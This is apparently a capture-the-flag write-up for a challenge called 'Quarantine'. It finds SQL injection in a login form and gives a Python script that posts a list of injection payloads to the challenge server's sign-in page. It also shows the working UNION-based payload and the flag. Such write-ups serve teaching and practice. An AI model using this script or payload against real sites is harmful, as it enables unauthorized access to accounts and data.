# Quarantine

After testing on the website I found that entering `'` in the password field gave a 500 error

Yesss - SQL Injection!

I then copied a load of sql injection payloads from https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b into a text file

## Writing a python script to test all the payloads

```
import requests
import re

url = "http://95.216.233.106:15009/sign-in"
Headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://95.216.233.106:15009/sign-in", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
Payloads = open('injection.txt','r')

for payload in Payloads:
    payload = payload.strip()
    Data = {"user": "admin", "pass": payload}
    success = requests.post(url, headers=Headers, data=Data)
    error1 = re.findall('Invalid username / password', success.text)
    error2 = re.findall('Attempting to login as more than one user!??', success.text)
    if len(error1) == 0 and len(error2) == 0:
        if success.status_code == 200:
            print(payload)
```

```
$ python3 exploit.py 
-1' UNION SELECT 1,2,3--+
```
Enter the payload into the password field and you meet the flag

ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}




